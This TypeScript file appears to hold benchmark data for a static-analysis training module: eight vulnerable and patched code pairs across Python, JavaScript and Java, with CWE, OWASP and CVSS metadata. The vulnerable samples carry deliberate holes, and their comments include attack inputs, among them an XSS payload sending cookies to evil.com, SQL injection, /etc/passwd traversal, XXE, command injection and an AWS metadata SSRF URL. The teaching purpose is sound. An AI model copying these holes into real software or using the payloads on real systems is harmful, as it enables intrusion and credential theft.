// =============================================================================
// CyberShield Bharat -- SAST Benchmark Loader
// Static Analysis Security Testing vulnerable/patched code pairs
// Used by the DevSec Code Auditor training and demonstration module
// =============================================================================

export type SASTSeverity = 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
export type SASTLanguage = 'python' | 'javascript' | 'java' | 'typescript' | 'php'
export type OWASPCategory =
  | 'A01:2021-Broken Access Control'
  | 'A02:2021-Cryptographic Failures'
  | 'A03:2021-Injection'
  | 'A04:2021-Insecure Design'
  | 'A05:2021-Security Misconfiguration'
  | 'A06:2021-Vulnerable and Outdated Components'
  | 'A07:2021-Identification and Authentication Failures'
  | 'A08:2021-Software and Data Integrity Failures'
  | 'A09:2021-Security Logging and Monitoring Failures'
  | 'A10:2021-Server-Side Request Forgery'

export interface SASTVulnPair {
  id: string
  cweId: string
  cweName: string
  cvssScore?: number
  severity: SASTSeverity
  language: SASTLanguage | string
  description: string
  owaspCategory: OWASPCategory | string
  vulnerableCode: string
  patchedCode: string
  diff: string
}

export const SAST_VULN_PAIRS: SASTVulnPair[] = [
  // -------------------------------------------------------------------------
  // 1. SQL Injection (Python / Flask)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-001',
    cweId: 'CWE-89',
    cweName: 'SQL Injection',
    severity: 'CRITICAL',
    language: 'python',
    owaspCategory: 'A03:2021-Injection',
    description:
      'User-controlled input is directly concatenated into a SQL query string without parameterization. An attacker can inject arbitrary SQL to dump tables, bypass authentication, or execute admin commands (xp_cmdshell on MSSQL).',
    vulnerableCode: `# VULNERABLE: CWE-89 SQL Injection
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def get_user():
    user_id = request.args.get('id')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # VULNERABLE: Direct string interpolation
    query = f"SELECT * FROM users WHERE id = '{user_id}'"
    # Attacker sends: ?id=' OR '1'='1
    # Query becomes: SELECT * FROM users WHERE id = '' OR '1'='1'
    # Returns ALL users, bypassing authentication
    cursor.execute(query)
    row = cursor.fetchone()
    return str(row)`,
    patchedCode: `# PATCHED: Parameterized query (CWE-89 remediated)
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def get_user():
    user_id = request.args.get('id')
    if not user_id or not user_id.isdigit():
        return 'Invalid ID', 400
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # SAFE: Parameterized query -- user_id is never interpreted as SQL
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (int(user_id),))
    row = cursor.fetchone()
    return str(row) if row else ('Not found', 404)`,
    diff: `- query = f"SELECT * FROM users WHERE id = '{user_id}'"
- cursor.execute(query)
+ if not user_id or not user_id.isdigit():
+     return 'Invalid ID', 400
+ query = "SELECT * FROM users WHERE id = ?"
+ cursor.execute(query, (int(user_id),))`,
  },
  // -------------------------------------------------------------------------
  // 2. Reflected XSS (JavaScript / Node.js Express)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-002',
    cweId: 'CWE-79',
    cweName: 'Cross-site Scripting (XSS)',
    severity: 'HIGH',
    language: 'javascript',
    owaspCategory: 'A03:2021-Injection',
    description:
      'User-supplied search query is reflected directly into an HTML response without HTML entity encoding. An attacker can craft a URL with embedded JavaScript that executes in the victim\'s browser, stealing session cookies or performing actions on behalf of the user.',
    vulnerableCode: `// VULNERABLE: CWE-79 Reflected XSS
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  const query = req.query.q;
  // VULNERABLE: User input directly interpolated into HTML
  // Attacker sends: /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
  res.send(\`
    <html>
      <body>
        <h1>Search Results for: \${query}</h1>
        <p>No results found.</p>
      </body>
    </html>
  \`);
});`,
    patchedCode: `// PATCHED: HTML entity encoding (CWE-79 remediated)
const express = require('express');
const app = express();

// HTML entity encoding function
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

app.get('/search', (req, res) => {
  const query = req.query.q ?? '';
  const safeQuery = escapeHtml(query);
  // Content-Security-Policy header also added as defense-in-depth
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.send(\`
    <html>
      <body>
        <h1>Search Results for: \${safeQuery}</h1>
        <p>No results found.</p>
      </body>
    </html>
  \`);
});`,
    diff: `- res.send(\`<h1>Search Results for: \${query}</h1>\`);
+ const safeQuery = escapeHtml(query);
+ res.setHeader('Content-Security-Policy', "default-src 'self'");
+ res.send(\`<h1>Search Results for: \${safeQuery}</h1>\`);`,
  },
  // -------------------------------------------------------------------------
  // 3. Path Traversal (Java / Spring Boot)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-003',
    cweId: 'CWE-22',
    cweName: 'Path Traversal',
    severity: 'HIGH',
    language: 'java',
    owaspCategory: 'A01:2021-Broken Access Control',
    description:
      'A file download endpoint uses user-supplied filename directly to construct a file path. An attacker can supply "../../../etc/passwd" to read arbitrary files on the server, including sensitive configuration files and credentials.',
    vulnerableCode: `// VULNERABLE: CWE-22 Path Traversal
@RestController
public class FileController {

    private static final String BASE_DIR = "/var/app/reports/";

    @GetMapping("/download")
    public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
        // VULNERABLE: No path validation
        // Attacker sends: ?filename=../../../../etc/passwd
        File file = new File(BASE_DIR + filename);
        Resource resource = new FileSystemResource(file);
        return ResponseEntity.ok()
            .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=" + filename)
            .body(resource);
    }
}`,
    patchedCode: `// PATCHED: Canonical path validation (CWE-22 remediated)
@RestController
public class FileController {

    private static final String BASE_DIR = "/var/app/reports/";

    @GetMapping("/download")
    public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
        // Sanitize filename: strip path separators
        String sanitizedFilename = Paths.get(filename).getFileName().toString();

        File file = new File(BASE_DIR + sanitizedFilename);
        String canonicalPath = file.getCanonicalPath();

        // Verify the resolved path stays within BASE_DIR
        if (!canonicalPath.startsWith(new File(BASE_DIR).getCanonicalPath() + File.separator)) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
        }

        if (!file.exists() || !file.isFile()) {
            return ResponseEntity.notFound().build();
        }

        Resource resource = new FileSystemResource(file);
        return ResponseEntity.ok()
            .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=" + sanitizedFilename)
            .body(resource);
    }
}`,
    diff: `- File file = new File(BASE_DIR + filename);
+ String sanitizedFilename = Paths.get(filename).getFileName().toString();
+ File file = new File(BASE_DIR + sanitizedFilename);
+ String canonicalPath = file.getCanonicalPath();
+ if (!canonicalPath.startsWith(new File(BASE_DIR).getCanonicalPath() + File.separator)) {
+     return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
+ }`,
  },
  // -------------------------------------------------------------------------
  // 4. SSRF (Python / Django)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-004',
    cweId: 'CWE-918',
    cweName: 'Server-Side Request Forgery (SSRF)',
    severity: 'CRITICAL',
    language: 'python',
    owaspCategory: 'A10:2021-Server-Side Request Forgery',
    description:
      'A webhook or URL-fetch endpoint takes a URL from user input and fetches it server-side without validation. An attacker can supply internal URLs (http://169.254.169.254/latest/meta-data/ for AWS metadata, http://localhost:8080/admin) to access internal services not exposed to the internet.',
    vulnerableCode: `# VULNERABLE: CWE-918 Server-Side Request Forgery
import requests
from django.http import JsonResponse
from django.views import View

class WebhookPreviewView(View):
    def get(self, request):
        url = request.GET.get('url')
        # VULNERABLE: Fetches any URL including internal ones
        # Attacker: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
        # On AWS: leaks IAM role credentials with full account access
        response = requests.get(url, timeout=5)
        return JsonResponse({'status': response.status_code,
                             'content': response.text[:500]})`,
    patchedCode: `# PATCHED: URL allowlist + private IP blocking (CWE-918 remediated)
import requests
import ipaddress
import socket
from urllib.parse import urlparse
from django.http import JsonResponse
from django.views import View

ALLOWED_SCHEMES = {'https'}
BLOCKED_HOSTS = {'localhost', '127.0.0.1', '0.0.0.0', '::1'}

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        hostname = parsed.hostname
        if not hostname or hostname.lower() in BLOCKED_HOSTS:
            return False
        # Resolve hostname and check for private/link-local IPs
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return False
        return True
    except Exception:
        return False

class WebhookPreviewView(View):
    def get(self, request):
        url = request.GET.get('url', '')
        if not is_safe_url(url):
            return JsonResponse({'error': 'URL not permitted'}, status=400)
        response = requests.get(url, timeout=5, allow_redirects=False)
        return JsonResponse({'status': response.status_code,
                             'content': response.text[:500]})`,
    diff: `- response = requests.get(url, timeout=5)
+ if not is_safe_url(url):
+     return JsonResponse({'error': 'URL not permitted'}, status=400)
+ response = requests.get(url, timeout=5, allow_redirects=False)`,
  },
  // -------------------------------------------------------------------------
  // 5. XXE (Java)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-005',
    cweId: 'CWE-611',
    cweName: 'XML External Entity (XXE) Injection',
    severity: 'HIGH',
    language: 'java',
    owaspCategory: 'A03:2021-Injection',
    description:
      'An XML parser processes user-supplied XML with external entity processing enabled. An attacker can define an external entity referencing a local file (file:///etc/passwd) or an internal URL, causing the parser to read and include the file contents in the output.',
    vulnerableCode: `// VULNERABLE: CWE-611 XXE Injection
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.ByteArrayInputStream;

public class XmlParser {
    public Document parse(String xml) throws Exception {
        // VULNERABLE: Default factory has XXE enabled
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        // Attacker sends XML:
        // <?xml version="1.0"?>
        // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        // <root><data>&xxe;</data></root>
        return builder.parse(new ByteArrayInputStream(xml.getBytes()));
    }
}`,
    patchedCode: `// PATCHED: Disable external entity processing (CWE-611 remediated)
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.ByteArrayInputStream;

public class XmlParser {
    public Document parse(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Disable DOCTYPE declarations entirely
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        // Disable external general entities
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        // Disable external parameter entities
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        // Disable external DTD loading
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xml.getBytes()));
    }
}`,
    diff: `- DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+ DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+ factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+ factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+ factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+ factory.setXIncludeAware(false);
+ factory.setExpandEntityReferences(false);`,
  },
  // -------------------------------------------------------------------------
  // 6. Command Injection (Python)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-006',
    cweId: 'CWE-78',
    cweName: 'OS Command Injection',
    severity: 'CRITICAL',
    language: 'python',
    owaspCategory: 'A03:2021-Injection',
    description:
      'User input is passed to os.system() or subprocess with shell=True, allowing injection of arbitrary shell commands. An attacker can append ";" followed by any shell command, achieving remote code execution as the web server user.',
    vulnerableCode: `# VULNERABLE: CWE-78 Command Injection
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    # VULNERABLE: shell=True with unsanitized user input
    # Attacker: ?host=8.8.8.8; cat /etc/passwd; whoami
    result = os.popen(f'ping -c 1 {host}').read()
    return f'<pre>{result}</pre>'`,
    patchedCode: `# PATCHED: Subprocess with list args + input validation (CWE-78 remediated)
import subprocess
import re
from flask import Flask, request

app = Flask(__name__)

# Strict allowlist: only valid hostname/IP pattern
HOSTNAME_PATTERN = re.compile(
    r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9]{2,}$'
)
IP_PATTERN = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')

@app.route('/ping')
def ping():
    host = request.args.get('host', '').strip()
    if not host or (not HOSTNAME_PATTERN.match(host) and not IP_PATTERN.match(host)):
        return 'Invalid host', 400
    # SAFE: List form prevents shell injection; shell=False (default)
    result = subprocess.run(
        ['ping', '-c', '1', '-W', '2', host],
        capture_output=True, text=True, timeout=5, shell=False
    )
    output = result.stdout or result.stderr
    return f'<pre>{output}</pre>'`,
    diff: `- result = os.popen(f'ping -c 1 {host}').read()
+ if not host or (not HOSTNAME_PATTERN.match(host) and not IP_PATTERN.match(host)):
+     return 'Invalid host', 400
+ result = subprocess.run(['ping', '-c', '1', host],
+                         capture_output=True, text=True, timeout=5, shell=False)`,
  },
  // -------------------------------------------------------------------------
  // 7. Insecure Deserialization (Java)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-007',
    cweId: 'CWE-502',
    cweName: 'Deserialization of Untrusted Data',
    severity: 'CRITICAL',
    language: 'java',
    owaspCategory: 'A08:2021-Software and Data Integrity Failures',
    description:
      'Java ObjectInputStream.readObject() is called on untrusted user data. If the classpath contains gadget classes (Apache Commons Collections, Spring, etc.), an attacker can craft a serialized payload that achieves remote code execution when deserialized.',
    vulnerableCode: `// VULNERABLE: CWE-502 Insecure Java Deserialization
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import javax.servlet.http.HttpServletRequest;

public class SessionManager {
    public Object restoreSession(HttpServletRequest request) throws Exception {
        String serialized = request.getParameter("session");
        byte[] data = Base64.getDecoder().decode(serialized);
        // VULNERABLE: Deserializes arbitrary attacker-controlled class graph
        // ysoserial payload for CommonsCollections6 achieves RCE here
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        return ois.readObject();
    }
}`,
    patchedCode: `// PATCHED: Type-checking ObjectInputStream (CWE-502 remediated)
import java.io.*;
import java.util.Base64;
import java.util.Set;
import javax.servlet.http.HttpServletRequest;

public class SessionManager {

    // Allowlist of classes permitted to be deserialized
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.app.SessionData",
        "java.util.HashMap",
        "java.lang.String",
        "java.lang.Integer"
    );

    public Object restoreSession(HttpServletRequest request) throws Exception {
        String serialized = request.getParameter("session");
        byte[] data = Base64.getDecoder().decode(serialized);

        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                if (!ALLOWED_CLASSES.contains(desc.getName())) {
                    throw new InvalidClassException("Unauthorized deserialization: " + desc.getName());
                }
                return super.resolveClass(desc);
            }
        }) {
            return ois.readObject();
        }
    }
}

// RECOMMENDATION: Replace Java serialization entirely with JSON (Jackson/Gson)
// or use SignedObject to verify serialized data integrity`,
    diff: `- ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
- return ois.readObject();
+ try (ObjectInputStream ois = new ObjectInputStream(...) {
+     @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
+         if (!ALLOWED_CLASSES.contains(desc.getName()))
+             throw new InvalidClassException("Unauthorized: " + desc.getName());
+         return super.resolveClass(desc);
+     }
+ }) { return ois.readObject(); }`,
  },
  // -------------------------------------------------------------------------
  // 8. Weak Cryptography (JavaScript / Node.js)
  // -------------------------------------------------------------------------
  {
    id: 'SAST-008',
    cweId: 'CWE-327',
    cweName: 'Use of a Broken or Risky Cryptographic Algorithm',
    severity: 'HIGH',
    language: 'javascript',
    owaspCategory: 'A02:2021-Cryptographic Failures',
    description:
      'MD5 is used to hash user passwords before storage. MD5 is a fast, non-salted hash that is trivially broken using rainbow tables or GPU-accelerated cracking. Modern systems must use bcrypt, scrypt, or Argon2id with proper salt for password storage.',
    vulnerableCode: `// VULNERABLE: CWE-327 Weak password hashing with MD5
const crypto = require('crypto');
const db = require('./db');

async function registerUser(username, password) {
  // VULNERABLE: MD5 is broken for password storage:
  // 1. No salt -- same password always produces same hash (rainbow tables)
  // 2. MD5 is extremely fast -- billions of guesses/second with GPU
  // 3. MD5 collisions are computationally trivial to produce
  const passwordHash = crypto.createHash('md5').update(password).digest('hex');
  await db.query(
    'INSERT INTO users (username, password_hash) VALUES (?, ?)',
    [username, passwordHash]
  );
}

async function loginUser(username, password) {
  const hash = crypto.createHash('md5').update(password).digest('hex');
  const user = await db.query(
    'SELECT * FROM users WHERE username = ? AND password_hash = ?',
    [username, hash]
  );
  return user.length > 0;
}`,
    patchedCode: `// PATCHED: bcrypt with salt rounds (CWE-327 remediated)
const bcrypt = require('bcrypt');
const db = require('./db');

// NIST SP 800-63b recommends work factor that takes ~100ms to hash
// bcrypt: 10-12 rounds (2^10 = 1024 iterations, ~100ms)
// For higher security: use argon2id (npm install argon2)
const SALT_ROUNDS = 12;

async function registerUser(username, password) {
  // bcrypt automatically generates a cryptographically random salt
  // and embeds it in the hash output ($2b$12$<22-char-salt><31-char-hash>)
  const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);
  await db.query(
    'INSERT INTO users (username, password_hash) VALUES (?, ?)',
    [username, passwordHash]
  );
}

async function loginUser(username, password) {
  const user = await db.query(
    'SELECT password_hash FROM users WHERE username = ?',
    [username]
  );
  if (!user.length) return false;
  // bcrypt.compare is timing-attack-safe (constant-time comparison)
  return bcrypt.compare(password, user[0].password_hash);
}`,
    diff: `- const passwordHash = crypto.createHash('md5').update(password).digest('hex');
+ const SALT_ROUNDS = 12;
+ const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);

- const hash = crypto.createHash('md5').update(password).digest('hex');
- 'SELECT * FROM users WHERE ... AND password_hash = ?', [username, hash]
+ const user = await db.query('SELECT password_hash FROM users WHERE username = ?', [username]);
+ return bcrypt.compare(password, user[0].password_hash);`,
  },
]

const CVSS_DEFAULTS: Record<string, number> = {
  'SAST-001': 9.8,
  'SAST-002': 7.4,
  'SAST-003': 8.6,
  'SAST-004': 8.3,
  'SAST-005': 8.6,
  'SAST-006': 9.8,
  'SAST-007': 9.8,
  'SAST-008': 7.5,
}

export const SAST_PAIRS: SASTVulnPair[] = SAST_VULN_PAIRS.map(p => ({
  ...p,
  cvssScore: p.cvssScore ?? CVSS_DEFAULTS[p.id] ?? 7.5,
}))
